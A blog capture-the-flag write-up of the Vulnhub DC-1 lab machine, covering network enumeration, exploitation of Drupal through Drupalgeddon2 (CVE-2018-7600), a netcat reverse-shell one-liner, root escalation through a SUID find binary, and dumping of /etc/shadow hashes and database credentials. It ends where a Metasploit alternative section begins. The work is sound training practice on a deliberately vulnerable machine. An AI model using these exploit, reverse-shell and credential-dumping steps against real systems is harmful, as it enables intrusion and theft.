---
title: Write-up DC1 on Vulnhub
author: eMVee
date: 2023-03-25 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP, SUID, Drupal]
render_with_liquid: false
---

This machine was hacked once in the past, but if I try to recall the vulnerabilities it does not ring a bell. Since I am getting ready for the OSCP exam, I am working through the famous TJnull OSCP list. This vulnerable machine (DC1) is related to several machines on that list, but it is not listed on the list of TJnull. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/dc-1,292/). After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.

## Getting started
First create a working directory for this Vulnhub machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd DC-1 
```
Let's check my own IP address on the machine
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15
```
We have identified our own IP address of our Kali machine.

## Enumeration is key
Now we should enumerate the virtual network for new IP addresses. First we can use use arp-scan.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ sudo arp-scan 10.0.2.0/24     
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:23:77       PCS Systemtechnik GmbH
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.30       08:00:27:ff:62:68       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.198 seconds (116.47 hosts/sec). 4 responded
```
The second method I will use, is with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ fping -ag 10.0.2.0/24 2> /dev/null              
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.30
```
Then there is another method with netdiscover. 
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ sudo netdiscover -r 10.0.2.0/24 
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 
  4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor        
 10.0.2.3        08:00:27:45:23:77      1      60  PCS Systemtechnik GmbH
 10.0.2.30       08:00:27:ff:62:68      1      60  PCS Systemtechnik GmbH
```
After enumerating the network, I can pretty sure say `10.0.2.30` is our target.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ ip=10.0.2.30
```
After creating a IP variable with the IP address of the target, it is time to send a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ ping $ip -c 3         
PING 10.0.2.30 (10.0.2.30) 56(84) bytes of data.
64 bytes from 10.0.2.30: icmp_seq=1 ttl=64 time=0.522 ms
64 bytes from 10.0.2.30: icmp_seq=2 ttl=64 time=1.26 ms
64 bytes from 10.0.2.30: icmp_seq=3 ttl=64 time=1.33 ms

--- 10.0.2.30 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2024ms
rtt min/avg/max/mdev = 0.522/1.038/1.329/0.365 ms

```
Based on the value 64 in the ttl field, we can asume this box is a Linux machine.
Now let's run a simple port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ nmap -T4 -Pn $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-25 23:11 CET
Nmap scan report for 10.0.2.30
Host is up (0.00068s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds

```
There are three ports open in our basic scan.
* Port 22
	* SSH
* Port 80
	* HTTP
* Port 111
	* RPC
Based on the three ports, I would like to start with port 80 and launch whatweb to identify some technologies.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ whatweb http://$ip        
http://10.0.2.30 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[10.0.2.30], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]

```
Well, whatweb discovered a lot of useful information:
* Linux: Debian
* Apache 2.2.22
* PHP 5.4.45
* Drupal

Now let's enumerate with nikto some other information and perhaps a vulnerability.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ nikto -h http://$ip      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.30
+ Target Hostname:    10.0.2.30
+ Target Port:        80
+ Start Time:         2023-03-25 23:13:02 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-generator' found, with contents: Drupal 7 (http://drupal.org)
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 152289, size: 1561, mtime: Wed Nov 20 21:45:59 2013
+ Entry '/INSTALL.mysql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.pgsql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.sqlite.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/install.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/LICENSE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/MAINTAINERS.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/UPGRADE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 36 entries which should be manually viewed.
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-39272: /misc/favicon.ico file identifies this app/server as: Drupal 7.x
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /user/: This might be interesting...

```
Nikto discovered a lot of information related to Drupal. Let's visit the website.

![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230325232317.png){: width="700" height="400" }

Wappalyzer identified that Drupal 7 might be used here.
Let's run droopescan to enumerate automatically.
```bash
┌──(emvee㉿kali)-[~/tools/droopescan]
└─$ droopescan scan drupal -u http://10.0.2.30 -t 32
[+] Plugins found:                                                              
    ctools http://10.0.2.30/sites/all/modules/ctools/
        http://10.0.2.30/sites/all/modules/ctools/LICENSE.txt
        http://10.0.2.30/sites/all/modules/ctools/API.txt
    views http://10.0.2.30/sites/all/modules/views/
        http://10.0.2.30/sites/all/modules/views/README.txt
        http://10.0.2.30/sites/all/modules/views/LICENSE.txt
    profile http://10.0.2.30/modules/profile/
    php http://10.0.2.30/modules/php/
    image http://10.0.2.30/modules/image/

[+] Themes found:
    seven http://10.0.2.30/themes/seven/
    garland http://10.0.2.30/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://10.0.2.30/user/login

[+] Scan finished (0:09:39.383490 elapsed)

```
Based on the information from droopescan, it's time to see if there is a known vulnerability with an exploit available. Let's check with searchsploit.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ searchsploit drupal 7
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 4.1/4.2 - Cross-Site Scripting                                                                                                                                                                     | php/webapps/22940.txt
Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                                                                                                             | php/webapps/1088.pl
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                                                               | php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                                                                             | php/webapps/27020.txt
Drupal 5.2 - PHP Zend Hash ation Vector                                                                                                                                                                   | php/webapps/4510.txt
Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                                                                    | php/webapps/11060.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                                                                         | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                                                                          | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                                                               | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                                                               | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                                                                  | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                                                                                                    | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                                                                                                        | php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                                                                   | php/webapps/3313.pl
Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                                                                     | php/webapps/3312.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                                                                                             | php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                                                                                                                         | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                                                  | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                                                  | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                                                               | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                       | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                                                          | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                                                     | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                                                     | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                                                            | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                                                                        | php/webapps/46459.py
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                                                                         | php/webapps/44501.txt
Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting (XSS)                                                                                                                                        | php/webapps/50841.txt
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                                                    | php/webapps/25493.txt
Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                                                                           | php/webapps/40149.rb
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                                                             | php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                                                                                                   | php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                                                                                                            | php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                                                                              | php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                                                                         | php/remote/40130.rb
Drupal Module Sections - Cross-Site Scripting                                                                                                                                                             | php/webapps/10485.txt
Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection                                                                                                                                                   | php/webapps/33410.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                   
```
Probably this version is vulnerable for druppalgeddon. To confirm this let's run the druppalgeddon2-scanner.

```bash
┌──(emvee㉿kali)-[~/tools/CVE-2018-7600-drupalgeddon2-scanner]
└─$ python3 drupalgeddon2-scan.py -i 10.0.2.30
[~] Starting scan...
==========================================================================
[~] http://10.0.2.30                                             [  OK   ]
     -- Vulnerable (CVE-2018-7600)
==========================================================================
[+] 1 target(s) scanned, 1 target(s) vulnerable (CVE-2018-7600)
[+] Scan completed in 6.877 seconds

```

So the target is vulnerable for the druppalgeddon2 vulnerability.
```bash
┌──(emvee㉿kali)-[~/tools/CVE-2018-7600]
└─$ python drupa7-CVE-2018-7600.py -c whoami http://10.0.2.30
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
()
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-Bg-pRNxz57cqHzTZhXROmuBjPkwxz8CEulCPzUCxqZU
[*] Triggering exploit to execute: whoami
www-data

```
Now start a netcat listener on port 53
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ sudo nc -lvp 53                 
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53

```
Now start a reverse shell to my netcat listener.
```bash
┌──(emvee㉿kali)-[~/tools/CVE-2018-7600]
└─$ python drupa7-CVE-2018-7600.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.2.15 53 >/tmp/f' http://10.0.2.30
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
()
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-5TUpJ7_gHDfaw05UhnEbcBQlyzrUiGIVfsdyFrv8TvQ
[*] Triggering exploit to execute: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.2.15 53 >/tmp/f

```

## Initial access
Now go back to the netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ sudo nc -lvp 53                 
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.0.2.30.
Ncat: Connection from 10.0.2.30:50530.
sh: 0: can't access tty; job control turned off
$ 

```
A connection has been established. Now we have to upgrade the tty shell a bit.

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@DC-1:/var/www$ 
www-data@DC-1:/var/www$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
www-data@DC-1:/var/www$ export TERM=xterm-256color  
export TERM=xterm-256color  
www-data@DC-1:/var/www$ alias ll='ls -lsaht --color=auto'  
alias ll='ls -lsaht --color=auto'  
```
Now we should suspend the session for a moment with `CTRL + Z`.
```bash
www-data@DC-1:/var/www$ ^Z
zsh: suspended  sudo nc -lvp 53
```
One more last step and we are ready to go.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ stty raw -echo ; fg ; reset  
[1]  + continued  sudo nc -lvp 53

```
Now we can continue on the victim again.
```bash
www-data@DC-1:/var/www$ stty columns 200 rows 200
stty columns 200 rows 200
www-data@DC-1:/var/www$ 

```
Let's try to capture the first flag.
```bash
www-data@DC-1:/var/www$ cat flag1.txt   
cat flag1.txt
Every good CMS needs a config file - and so do you.
www-data@DC-1:/var/www$ 
```
Let's find out what Linux distro and kernal are used on this machine.
```bash
www-data@DC-1:/var/www$ uname -a
uname -a
Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
www-data@DC-1:/var/www$ uname -mrs
uname -mrs
Linux 3.2.0-6-486 i686
www-data@DC-1:/var/www$ cat /proc/version
cat /proc/version
Linux version 3.2.0-6-486 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb7u1) ) #1 Debian 3.2.102-1
www-data@DC-1:/var/www$ cat /etc/issue
cat /etc/issue
Debian GNU/Linux 7 \n \l

www-data@DC-1:/var/www$ cat /etc/*-release
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 7 (wheezy)"
NAME="Debian GNU/Linux"
VERSION_ID="7"
VERSION="7 (wheezy)"
ID=debian
ANSI_COLOR="1;31"
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support/"
BUG_REPORT_URL="http://bugs.debian.org/"
www-data@DC-1:/var/www$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 7.11 (wheezy)
Release:        7.11
Codename:       wheezy
www-data@DC-1:/var/www$ 

```
We should add to our notes that we are running on a Debian 7 and Linux 3.2.0-6-486 i686.
Next step is to enumerate some users on the victim. We can check the `/etc/passwd` file for some users on the system.
```bash
www-data@DC-1:/var/www$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
www-data@DC-1:/var/www$ 

```
It looks like there is a user named `flag4`, this user probably has flag 4 in the home directory.
Let's find out what files there are in the `/var/www` directory. They mentioned something about a configuration file for every CMS.
```bash
www-data@DC-1:/var/www$ ll
ll
total 188K
4.0K drwxr-xr-x  9 www-data www-data 4.0K Feb 19  2019 .
4.0K -rw-r--r--  1 www-data www-data   52 Feb 19  2019 flag1.txt
4.0K drwxr-xr-x 12 root     root     4.0K Feb 19  2019 ..
4.0K -rw-r--r--  1 www-data www-data  174 Nov 21  2013 .gitignore
8.0K -rw-r--r--  1 www-data www-data 5.7K Nov 21  2013 .htaccess
4.0K -rw-r--r--  1 www-data www-data 1.5K Nov 21  2013 COPYRIGHT.txt
4.0K -rw-r--r--  1 www-data www-data 1.5K Nov 21  2013 INSTALL.mysql.txt
4.0K -rw-r--r--  1 www-data www-data 1.9K Nov 21  2013 INSTALL.pgsql.txt
4.0K -rw-r--r--  1 www-data www-data 1.3K Nov 21  2013 INSTALL.sqlite.txt
 20K -rw-r--r--  1 www-data www-data  18K Nov 21  2013 INSTALL.txt
8.0K -rw-r--r--  1 www-data www-data 8.0K Nov 21  2013 MAINTAINERS.txt
8.0K -rw-r--r--  1 www-data www-data 5.3K Nov 21  2013 README.txt
 12K -rw-r--r--  1 www-data www-data 9.5K Nov 21  2013 UPGRADE.txt
8.0K -rw-r--r--  1 www-data www-data 6.5K Nov 21  2013 authorize.php
4.0K -rw-r--r--  1 www-data www-data  720 Nov 21  2013 cron.php
4.0K drwxr-xr-x  4 www-data www-data 4.0K Nov 21  2013 includes
4.0K -rw-r--r--  1 www-data www-data  529 Nov 21  2013 index.php
4.0K -rw-r--r--  1 www-data www-data  703 Nov 21  2013 install.php
4.0K drwxr-xr-x  4 www-data www-data 4.0K Nov 21  2013 misc
4.0K drwxr-xr-x 42 www-data www-data 4.0K Nov 21  2013 modules
4.0K drwxr-xr-x  5 www-data www-data 4.0K Nov 21  2013 profiles
4.0K -rw-r--r--  1 www-data www-data 1.6K Nov 21  2013 robots.txt
4.0K drwxr-xr-x  2 www-data www-data 4.0K Nov 21  2013 scripts
4.0K drwxr-xr-x  4 www-data www-data 4.0K Nov 21  2013 sites
4.0K drwxr-xr-x  7 www-data www-data 4.0K Nov 21  2013 themes
 20K -rw-r--r--  1 www-data www-data  20K Nov 21  2013 update.php
4.0K -rw-r--r--  1 www-data www-data 2.2K Nov 21  2013 web.config
4.0K -rw-r--r--  1 www-data www-data  417 Nov 21  2013 xmlrpc.php
 20K -rwxr-xr-x  1 www-data www-data  18K Nov  1  2013 LICENSE.txt
www-data@DC-1:/var/www$ ll /sites
ll /sites
ls: cannot access /sites: No such file or directory
www-data@DC-1:/var/www$ ll sites
ll sites
total 24K
4.0K dr-xr-xr-x 3 www-data www-data 4.0K Feb 19  2019 default
4.0K drwxr-xr-x 9 www-data www-data 4.0K Feb 19  2019 ..
4.0K drwxr-xr-x 4 www-data www-data 4.0K Nov 21  2013 .
4.0K -rw-r--r-- 1 www-data www-data  904 Nov 21  2013 README.txt
4.0K drwxr-xr-x 4 www-data www-data 4.0K Nov 21  2013 all
4.0K -rw-r--r-- 1 www-data www-data 2.4K Nov 21  2013 example.sites.php
www-data@DC-1:/var/www$ ll sites/default
ll sites/default
total 52K
4.0K dr-xr-xr-x 3 www-data www-data 4.0K Feb 19  2019 .
 16K -r--r--r-- 1 www-data www-data  16K Feb 19  2019 settings.php
4.0K drwxrwxr-x 3 www-data www-data 4.0K Feb 19  2019 files
4.0K drwxr-xr-x 4 www-data www-data 4.0K Nov 21  2013 ..
 24K -rw-r--r-- 1 www-data www-data  23K Nov 21  2013 default.settings.php
www-data@DC-1:/var/www$ cat sites/default/settings.php
cat sites/default/settings.php
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

/**

```
We got a second flag on the system. Let's check for file permissions with a SUID bit.
```bash
www-data@DC-1:/var/www$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs

```
It looks like there is a SUID bit set on `/usr/bin/find`
This could be used to escalate our privileges, see: https://gtfobins.github.io/gtfobins/find/#suid

## Privilege escalation
Let's run the example from GTFObins.
```bash
www-data@DC-1:/var/www$ find . -exec "/bin/sh" \;
find . -exec "/bin/sh" \;
# 
```
We got a shell on the victim. Now let's check who I am.
```bash
# whoami;id;hostname
whoami;id;hostname
root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
DC-1
```
We are root on the machine. Now we only have to capture the root flag.
```bash
# cd /root
cd /root
# ls
ls
thefinalflag.txt
```
Now let's do the OSCP style to capture the proof.
```bash
# whoami;id;hostname;ifconfig;cat thefinalflag.txt
whoami;id;hostname;ifconfig;cat thefinalflag.txt
root
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
DC-1
eth0      Link encap:Ethernet  HWaddr 08:00:27:ff:62:68  
          inet addr:10.0.2.30  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:feff:6268/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:6355 errors:0 dropped:0 overruns:0 frame:0
          TX packets:11237 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1580537 (1.5 MiB)  TX bytes:3816634 (3.6 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:481 errors:0 dropped:0 overruns:0 frame:0
          TX packets:481 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:47604 (46.4 KiB)  TX bytes:47604 (46.4 KiB)

Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
# 

```

## Post exploitation
As soon as we are root on the box, cpature all kind of information such as hashes located in `/etc/shadow`. Store them and crack them.
```bash
# cat /etc/shadow
cat /etc/shadow
root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::
daemon:*:17946:0:99999:7:::
bin:*:17946:0:99999:7:::
sys:*:17946:0:99999:7:::
sync:*:17946:0:99999:7:::
games:*:17946:0:99999:7:::
man:*:17946:0:99999:7:::
lp:*:17946:0:99999:7:::
mail:*:17946:0:99999:7:::
news:*:17946:0:99999:7:::
uucp:*:17946:0:99999:7:::
proxy:*:17946:0:99999:7:::
www-data:*:17946:0:99999:7:::
backup:*:17946:0:99999:7:::
list:*:17946:0:99999:7:::
irc:*:17946:0:99999:7:::
gnats:*:17946:0:99999:7:::
nobody:*:17946:0:99999:7:::
libuuid:!:17946:0:99999:7:::
Debian-exim:!:17946:0:99999:7:::
statd:*:17946:0:99999:7:::
messagebus:*:17946:0:99999:7:::
sshd:*:17946:0:99999:7:::
mysql:!:17946:0:99999:7:::
flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
```

----
## Alternative 1 Metasploit
Start Metasploit.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
